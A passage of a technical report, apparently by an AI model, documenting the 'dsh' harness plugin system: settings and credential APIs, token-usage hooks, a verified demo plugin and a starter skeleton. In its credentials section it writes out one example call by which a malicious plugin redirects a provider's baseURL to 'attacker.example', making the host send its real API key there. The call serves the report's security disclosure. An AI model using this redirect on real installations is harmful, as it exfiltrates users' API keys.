  ns: Namespace & SettingsNamespaceInput<Namespace>, schema: z<T>, options?: SettingsRegisterOptions<T>
): SettingsScope<T>;
```
```ts
export interface SettingsScope<T> {
    get(): T;                                              // schema defaults → base → user layer
    watch(cb: (next: T, prev: T) => void | Promise<void>): () => void;
    update(patch: object): Promise<void>;                  // merge into the user layer
    replace(section: object): Promise<void>;               // replace the whole user section
}
```
Provider level: `describe({redactSecrets?})`, `get(ns)`, `update`, `replace`, `mutate(ns, ops, expectedRevision?)`,
`installSection(owner, ns, schema, entry, hooks)`. Events: `settings/updated`, `settings/document-updated`.

**The namespace string IS the YAML top-level key.** `dsh-settings-file/lib/index.js` renders
`new Document({ [ns]: section })` / `patchNode(document, [ns], …)` **[READ]**. Namespace grammar is enforced:
lowercase letter first, then `[a-z0-9-]` — hence `llm-pi-ai`, `agent-default-model`.

Real registrations in this install **[READ]**: `settings.register("agent-presets", …, { base: { default } })`;
`settings.installSection(ctx, "llm-deepseek" | "llm-pi-ai" | "agent-default-model", …)`.

**Client** — `ctx.settingsScope.bind({ namespace })` from `dsh-client-ui-settings`
**[READ]**, `settings-scope.d.ts`:
```ts
bind<T>(spec: SettingsScopeSpec<T>): SettingsScope<T>;   // { namespace, decode? }
// scope: getSnapshot(), subscribe(), mutate(ops, expectedRevision?), set(field, value), unset(field)
```
Reads are a selector over **one shared `settings.describe()` snapshot** read with `redactSecrets: true`;
writes go through `ctx.remote.settings.mutate`. On a non-loopback page the scope reports
`writable: false, mode: 'memory'` and the host document is never written **[READ]**,
`dsh-client-ui-settings/lib/client.js:1339`.

Wire surface **[READ]**, `dsh-api-settings-controller/lib/typert.remote-client.d.ts:17-25`:
```ts
settings/describe, settings/mutate(ns, ops, expectedRevision), settings/update, settings/replace,
settings/openSettingsDocument, settings/openAgentPresetDirectory, settings/canOpenAgentPresetDirectory
```
Path op: `{op:'set', path: string[], value: JsonValue} | {op:'unset', path: string[]}` **[READ]**.

### 6.4 Credentials

**Host** — `ctx.credentials` (`CredentialProvider`) **[READ]**, `dsh-credentials/lib/types/index.d.ts`:

```ts
resolve(ref: CredentialRef): Promise<ResolvedCredential | undefined>;   // { value, source: 'env'|'file'|'project-env'|'user-env' }
describe(ref): Promise<CredentialInfo>;    // { configured, source?, writable }  — no value field
set(ref, value): Promise<void>;  unset(ref): Promise<void>;
readRecord(key) / describeRecord(key) / listRecords() / modifyRecord(key, fn) / deleteRecord(key)
```

Two disjoint key spaces: `CredentialRef` = a POSIX env-var name (the `apiKeyEnv` world);
`CredentialKey` = `<plugin-scope>/<id>` (records, e.g. OAuth grants).

Storage layering **[READ]**, `dsh-credentials-local/lib/index.js:13-22`:
```
inherited process environment     (read-only, wins)
> $DSH_HOME/.credentials.yaml     (provider-managed, writable)
> <invocation cwd>/.env           (read-only fallback)
> $DSH_HOME/.env                  (read-only fallback)
```

**`apiKeyEnv` resolution [READ]**, `dsh-llm-pi-ai/lib/index.js:2479`:

```js
const resolveApiKey = async (provider, profile) => {
    const ref = profile.apiKeyEnv;
    if (ref === undefined) return undefined;
    const credentials = ctx.get("credentials");
    const hit = credentials !== undefined ? (await credentials.resolve(ref))?.value : launchEnvironmentOf(ctx).get(ref)?.value;
    if (hit !== undefined && hit.length > 0) return assertUsableApiKey(hit, "llm-pi-ai", ref);
    throw new LlmError(`llm-pi-ai: no credential for provider route "${provider}"; its profile resolves ${ref}, which is not set — …`, "MISSING_CREDENTIAL");
};
```

So `llm-pi-ai.providers.kimi-coding.apiKeyEnv: KIMI_CODING_API_KEY` in this machine's `settings.yaml` means
**per request**: `ctx.credentials.resolve(credentialRef("KIMI_CODING_API_KEY"))` → credentials-local →
inherited env first, then `.credentials.yaml`'s `refs:`. The schema role is declared explicitly:
`apiKeyEnv: z.string().role("credential-ref")` **[READ]**. `assertUsableApiKey` deliberately never echoes
any part of the key into the message **[READ]**.

**Can a client plugin read a secret? — No. Definitively no.**
The entire `credentials` remote namespace is three methods **[READ]**,
`dsh-api-settings-controller/lib/typert.remote-client.d.ts:11-16`:
```ts
describe: (refs: string[]) => Promise<RemoteResult<Record<string, CredentialInfo>>>   // no value field
set:      (ref: string, value: string) => Promise<RemoteResult<void>>
unset:    (ref: string) => Promise<RemoteResult<void>>
```
The controller's own doc: *"Secret values cross in one direction only — no method here returns one."*
`CredentialInfo` is `{configured, source?, writable}` with no field a value could ride in. An enumeration of
every `TypertRemoteMap` in the install (14 packages) found **no remote method anywhere that returns a secret
value**; `settings/describe` redacts.

**⚠️ Verifiable indirect exposure (not a read).** `settings/mutate` accepts **arbitrary string paths** in any
registered namespace, gated only by that namespace's schema **[READ]**, `dsh-settings/lib/index.js:433`.
`llm-pi-ai`'s profile schema declares `baseURL?: string` and `headers?: Record<string,string>` **[READ]**. A
malicious client plugin that injects `"remote.settings"` can therefore
`mutate("llm-pi-ai", [{op:"set", path:["providers","kimi-coding","baseURL"], value:"https://attacker.example"}], rev)`
and the host will resolve the real API key and send it to that endpoint. It is a **redirect, not a read**.
No authorization layer restricts which client plugin may call which remote namespace — `remote.<ns>` is an
ordinary Cordis service gated only by `inject` (a dependency declaration, not a permission) **[READ]**.

---

## 7. EXISTING QUOTA / USAGE SUPPORT

### 7.1 Verdict

- **Provider account balance / credits / spend / monetary cost: DOES NOT EXIST anywhere in dsh.** No balance
  endpoint is called; no monetary field is read or computed. **[READ + exhaustive grep]**
- **Provider rate-limit or quota HTTP headers (`x-ratelimit-*`, remaining/limit/reset): NOT READ anywhere.**
  The complete inventory of `headers.get(...)` calls across all 222 dsh packages is:
  ```
  dsh-client-connection/lib/index.js:609       content-type
  dsh-llm-deepseek/lib/index.js:1503           x-deepseek-request-id / x-request-id
  dsh-llm-deepseek/lib/index.js:1786           retry-after
  dsh-llm-pi-ai/lib/index.js:2081              content-length
  dsh-web-fetch-http/lib/index.js:421,460,498  location / content-type / content-length
  ```
- **Provider-reported token usage: YES — received, durably persisted, exposed to plugins at three levels.**
- **Quota-aware failure classification: YES**, but only a failure code, never an amount.

Two decoys that are *not* account quota:

1. `QUOTA_EXCEEDED_CODE = "QUOTA"` — produced by **regexing provider error message text** **[READ]**,
   `dsh-llm/lib/types/error.js:74`:
   ```js
   export function isQuotaExceededError(detail) {
       return /\binsufficient[\s_-]+(?:quota|balance|credits?)\b/i.test(detail)
           || /\b(?:quota|usage[\s_-]+limit)[\s_-]+(?:exceeded|exhausted|reached)\b/i.test(detail)
           || /\bexceed(?:ed|s)?[\s_-]+(?:(?:your|the)[\s_-]+)?(?:current[\s_-]+)?quota\b/i.test(detail)
           || /\b(?:balance|credits?)[\s_-]+(?:exhausted|depleted)\b/i.test(detail)
           || /\bout[\s_-]+of[\s_-]+(?:credits?|budget)\b/i.test(detail);
   }
   ```
2. `quota` throughout `dsh-llm-deepseek` — the **DeepSeek Files API** storage/file-count quota
   (`MAX_STORED_FILE_COUNT`, `fileQuotaCleanupBatch`) **[READ]**.

The single clearest "no spend facility" statement in the tree **[READ]**,
`dsh-llm-pi-ai/lib/index.js:262`:

```js
/**
* Pricing for a model the installed catalog does not describe. The harness
* never reads pi-ai's cost metadata — `replay.ts` zeroes it and no consumer
* reports spend — so this is the absence of a fact, not a configurable rate.
*/
const NO_COST = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 };
```

The DeepSeek adapter's only outbound URL is `` `${connection.baseURL}/chat/completions` `` **[READ]**.
Nothing in dsh issues a request to any account or balance endpoint.

### 7.2 What DOES exist: token usage, at three hook points

**A. Stream chunk (host, lowest level) — the `llm/stream` waterfall [READ]**,
`dsh-llm/lib/types/index.d.ts:43`:

```ts
declare module '@deepseek-ai/cordis' {
    interface Events {
        /**
         * Waterfall around every streaming model call (retry, replay, routing).
         * Bound to the {@link LlmRuntime}; call `next()` to reach the resolved
         * adapter's stream, or yield your own chunks to short-circuit.
         * @mode waterfall
         */
        'llm/stream'(this: LlmRuntime, options: GenerateOptions, next: () => AsyncIterable<StreamChunk>): AsyncIterable<StreamChunk>;
    }
}
```

The stream yields `{ type: 'usage'; usage: TokenUsage }` **before** the terminal `finish` **[READ]**.
Payload **[READ]**, `dsh-llm/lib/types/types.d.ts:123`:

```ts
export interface TokenUsage {
    inputTokens: number;          // UNCACHED input only — counts are DISJOINT
    outputTokens: number;
    totalTokens?: number;
    cacheReadTokens?: number;
    cacheWriteTokens?: number;
    reasoningTokens?: number;
}
```

Real shipped listener **[READ]**, `dsh-llm/lib/invariant.js:63`:
```js
ctx.on("llm/stream", (_options, next) => validateStream(next(), fail), { global: true, prepend: true });
```

**B. Durable session event — `assistant/message` [READ]**, `dsh-session/lib/types/types.d.ts:281`:

```ts
/**
 * Assembled assistant message for one step (derived history uses this).
 * Carries the step's `usage` when the adapter reported token accounting, so
 * the model output and its accounting travel together (there is no separate
 * usage record). `usage` is absent when the adapter reported none. …
 */
'assistant/message': { turn: number; step: number; message: AssistantMessage; usage?: TokenUsage; interrupted?: true };
```

The raw chunk is also durable as `assistant/chunk` (`chunk: StreamChunk`). **There is no `usage` session
event type** — usage rides inside these two.

**C. Session projection (browser, push)** — keys `tokenUsage`, `contextPressure`, `contextBreakdown`,
registered by `dsh-token-meter` **[READ]**, `dsh-token-meter/lib/types/projection.d.ts:79`:

```ts
declare module '@deepseek-ai/dsh-session-projection/types' {
    interface SessionProjectionMap {
        tokenUsage: TokenUsageProjection;
        contextPressure: ContextPressureProjection;
        contextBreakdown: ContextBreakdownProjection;
    }
}
```
```ts
export interface TokenUsageProjection {
    uncachedInputTokens: number; outputTokens: number;
    cacheReadTokens: number; cacheWriteTokens: number;
}
```

Read client-side with `useProjection(key)`, delivered as a standard prop to any slot with
`scope: 'session'` or `'session-maybe'`. The load-bearing doc line: *"the value is a user-facing reference,
**not a billing or gating input**."*

`dsh-token-meter` also exports a browser-safe fold **[READ]**, `turn-usage.d.ts:32`:
`deriveTurnTokenUsage(events): TurnTokenUsage | undefined` with
`TurnTokenUsageRoute = { provider, model }` — **the only provider-attributed usage shape in dsh**.

### 7.3 What a quota widget would have to do

| Step | Mechanism |
|---|---|
| Observe token usage | `ctx.on('llm/stream', (options, next) => …)` (per-chunk) |
| Observe usage durably | `ctx.on('session/event', …)` reading `assistant/message`.data.usage |
| Observe a quota *failure* | `ctx.on('session/event', …)` filtering `llm/retry` where `data.failure.code === 'QUOTA'` / `'RATE_LIMIT'` |
| Publish a value to the browser | `ctx.sessionProjections.register({key, stateSchema, stateVersion, init, apply, wire:{viewSchema, view}})` — the only supported host→browser value channel |
| Fetch an external balance | **you must do it yourself.** **There is no `ctx.http` service in dsh.** Use global `fetch` from a host plugin. |
| Render | `shell.overlay` (frame-wide badge/pill) or `settings.models.provider-card` (per-provider, keyed by `settingsNs`) |

**There is no existing quota/balance facility to reuse or extend. One would be built from scratch.**

---

## Appendix A — VERIFIED end-to-end demo

Everything in this appendix was executed on this machine. Artifacts live in the workspace.

**Fixture:** `/Users/cgeng/Workspaces/dsh-plan/research/demo-plugin/` — a 3-file plugin (`package.json`,
`cordis.patch.yml`, `lib/index.js`, `lib/client.js`), no TypeScript, no bundler, no build step.

**Sandbox:** `DSH_HOME=/Users/cgeng/Workspaces/dsh-plan/research/sandbox-home` (inside the workspace, so the
file sandbox was never violated), with `profiles/node_modules` symlinked to the real
`/Users/cgeng/.dsh/profiles/node_modules` so bare specifiers resolve. `profiles/web/package.json` lists
`dsh-demo-plugin` in both `dependencies` (`link:…`) and `dsh.profile.bundles`.

**Results:**

1. **Composition** — `DSH_HOME=… dsh --profile web --dump-config` emitted, at the end of the tree:
   ```yaml
   # == dsh-demo-plugin
   - id: dsh-demo-plugin
     name: dsh-demo-plugin
   ```
2. **Boot** — `DSH_HOME=… dsh --profile web --port 0 --no-open` printed
   `dsh web: http://127.0.0.1:55654/?token=…`; no composition or activation failure.
3. **Host half** — `curl http://127.0.0.1:55654/demo-plugin/ping` →
   `{"ok":true,"greeting":"hello from demo-plugin"}`.
4. **Client half served** — the HTML carried
   `globalThis["__DSH_BOOT__"] = {"rev":"a2ee7ce9dafe","entries":[… 47 rows …]}` including
   ```json
   { "id": "dsh-demo-plugin", "url": "/plugins/??dsh-demo-plugin/client.js&rev=fc0a9bc4f0b5afe2-45", "rev": "fc0a9bc4f0b5afe2-45", "inject": [] }
   ```
   and the row appeared in the `application` batch. Fetching that exact URL returned
   `HTTP 200, text/javascript; charset=utf-8, 1844 bytes` — our hand-written classic script.
   (`/plugins/dsh-demo-plugin/client.js` alone is a **404**; only the combo form is served.)
5. **Rendered** — in a real browser at that URL:
   ```js
   document.querySelector('[data-slot="shell.overlay"]').innerText
   // → "hello from demo-plugin"
   ```
   The text comes from `fetch('/demo-plugin/ping')` in the widget, i.e. the full browser → host → browser
   round trip worked.
6. **Live client HMR** — the seat was changed from `conversation.composer.bar` to `shell.overlay` by editing
   `lib/client.js` on disk **while the server was running**. Within the 500 ms poll the widget appeared in
   the DOM **with no page reload and no server restart**.

(An earlier attempt registered into `conversation.composer.bar`, a `single` seat already occupied by
`InputBar`. It did not render. That is consistent with the documented `single`-slot collision rule, but the
exact thrown error was not captured — see UNKNOWN list.)

**Screenshot:** `/Users/cgeng/Workspaces/dsh-plan/research/demo-widget-proof.png` (296 KB). This model cannot
read images, so the visual check is unverified; the DOM text assertion in step 5 is the actual proof.

---

## Appendix B — Recommended minimal skeleton (host + client, custom GUI widget)

```
my-plugin/
├── package.json
├── cordis.patch.yml
├── lib/
│   ├── index.js        # host half
│   └── client.js       # browser half — plain classic script, no build
└── node_modules/       # npm i here; dsh's deps are NOT visible from your realpath
```

**`package.json`**

```json
{
  "name": "my-plugin",
  "version": "0.1.0",
  "type": "module",
  "main": "lib/index.js",
  "exports": {
    ".":        { "default": "./lib/index.js" },
    "./client": { "default": "./lib/client.js" },
    "./package.json": "./package.json"
  },
  "files": ["lib", "cordis.patch.yml"],
  "dsh": {
    "bundle": { "patch": "./cordis.patch.yml" },
    "client": { "platform": "web", "inject": [] }
  },
  "peerDependencies": {
    "@deepseek-ai/cordis": "^4.0.2",
    "@deepseek-ai/schemastery": "^3.18.0",
    "@deepseek-ai/dsh-host-webserver": "^0.1.2-rc.1"
  },
  "peerDependenciesMeta": {
    "@deepseek-ai/cordis": { "optional": true },
    "@deepseek-ai/schemastery": { "optional": true },
    "@deepseek-ai/dsh-host-webserver": { "optional": true }
  }
}
```

**`cordis.patch.yml`**

```yaml
# Your bundle's layer. `name` is a bare specifier resolved from the profile dir.
- insert:
    - id: my-plugin
      name: my-plugin
      # config: { greeting: hi }     # optional; validated against the host's Config
```

**`lib/index.js`** — host half: one HTTP route, injectable as a Cordis service if you want one.

```js
import Schema from '@deepseek-ai/schemastery'

export const name = 'my-plugin'
export const inject = ['webServer']                  // wait for the server before applying

export const Config = Schema.object({
  greeting: Schema.string().default('hello'),
})

export function apply(ctx, config) {
  ctx.effect(() => ctx.webServer.register({
    kind: 'exact', path: '/my-plugin/ping',
    handler: (_req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify({ ok: true, greeting: config.greeting }))
    },
  }), 'my-plugin: route')
}
```

**`lib/client.js`** — browser half. No JSX, no bundler: `react` and `react/jsx-runtime` are shell seed words.

```js
window.__ModuleLoader__.load({
  id: 'my-plugin',
  factory: (require) => {
    var module = { exports: {} }
    var exports = module.exports
    var react = require('react')
    var jsx = require('react/jsx-runtime')

    var inject = ['slots']                 // Cordis services; NOT the package-name list

    function MyWidget() {
      var s = react.useState(null), data = s[0], setData = s[1]
      react.useEffect(function () {
        fetch('/my-plugin/ping').then(function (r) { return r.json() })
          .then(setData).catch(function () {})
      }, [])
      return jsx.jsx('div', {
        style: { position: 'absolute', right: 12, bottom: 12, padding: '4px 8px',
                 borderRadius: 12, background: 'var(--dsw-specific-tip)', fontSize: 12 },
        children: data === null ? '…' : data.greeting,
      })
    }

    function apply(ctx) {
      // shell.overlay = kind:'list', scope:'root', no shipped occupants.
      // Always rendered, never blocks the app (the layer is click-through).
      ctx.slots.inject('shell.overlay', function () {
        return ctx.slots.register(
          { name: 'shell.overlay', id: 'my-plugin', order: 100 },
          MyWidget,
        )
      })
    }

    exports.apply = apply
    exports.inject = inject
    return module.exports
  },
})
```

**Install**

```sh
cd my-plugin && npm install            # your own deps; dsh's closure is not visible
cd - && dsh plugin --profile web add /path/to/my-plugin
# restart the dsh web server (host rows mount at boot)
```

**Pick a different seat** by swapping the `inject`/`register` slot id — see §4.3:

| Where you want the widget | Slot id |
|---|---|
| Composer, immediately before the model selector | `conversation.input.right` (list) |
| Composer, left of the plan chip | `conversation.input.left` (list) |
| Below the composer card | `conversation.composer.dock` (list) |
| Sidebar foot, beside Settings | `sidebar.footer.action` (list) |
| Its own Settings page | `settings.section` (list, needs `id` + `label`) |
| One row in Settings → General | `settings.general.item` (list) |
| Frame-wide status pill / badge | `shell.overlay` (list) |
| Conversation header, right side | `conversation.session.header.utilities` (list) |

---

## UNKNOWN / could not verify

1. **`@deepseek-ai/dsh-typert-generator` is not installed** anywhere under either root. The exact recipe for
   producing `./typert` + `./remote` + the `declare module '@deepseek-ai/dsh-typert-protocol'` merges could
   not be read. Every generated file says *"Generated by … — do not edit"* and the READMEs link to an absent
   `../generator/README.md`. Consequence: the shipped (Route A) remote path is closed to a third party on
   this installation.
2. **Typert result-codec enforcement is undocumented in code.** `descriptor.result` is validated by the
   registry but no runtime call site reads it for unary calls in `dsh-api-gateway` (`lib/index.js` or
   `lib/client.js`), while `dsh-api-gateway/README.md:44` claims *"Unary results and every stream item are
   validated before reaching application code."* Inputs **are** validated on both sides. Either a build-time
   transform I could not inspect, or a doc/code divergence.
3. **`BaseOptions` / `ErasedOptions` for `ctx.slots.register`** are referenced by the `SlotCore.register`
   overloads but declared nowhere in installed artifacts. The option vocabulary below
   (`name`, `id`, `order`, `priority`, `label`, `key`, `select`, `children`, `store`, `locale`, `inject`,
   `registrant`) is reconstructed from the inlined `SlotCore` body and the 52-seat ledger.
4. **No `.d.ts` exists for `@deepseek-ai/dsh-client-ui-slots`, `dsh-client-store`, or
   `dsh-client-ui-primitives`** — they are shell-bundled only. Component prop signatures for the primitives
   are readable only from minified call sites.
5. **The exact error thrown by registering twice into a `single` slot** (and by inserting the same row id
   twice from two layers) was not captured — the first attempt at `conversation.composer.bar` simply did not
   render, and no console capture was in place.
6. **Host-half hot reload for a genuinely third-party plugin** was not exercised.
   `@deepseek-ai/cordis-plugin-hmr` is `disabled: true` in the web tree; whether enabling it reloads an
   external host half cleanly is unverified. Client-half HMR **is** verified (Appendix A step 6).
7. **`applies: 'live' | 'restart'` per namespace** in this deployment was not enumerated.
8. **Whether a dynamic (runtime-defined) client plugin half can inject `remote.settings`** was not traced
   through `dsh-cordis-host-runner`'s client-side guard.
9. **No package ships `src/`.** All `src/...` paths quoted in READMEs are unreadable locally; every snippet
   in this report comes from shipped `lib/*.js` or `lib/types/*.d.ts`.
10. **Three dangling symlinks** exist under `$PROFILES`: `dsh-client-runtime`, `dsh-host-apiproxy`,
    `dsh-tool-subagent-report`. Their contents could not be inspected.
11. **The public repo was not consulted.** Everything here was derived from the installed 0.1.2-rc.1
    artifacts, which are authoritative for this machine and may differ from `main` on
    `github.com/deepseek-ai/deepseek-harness`.
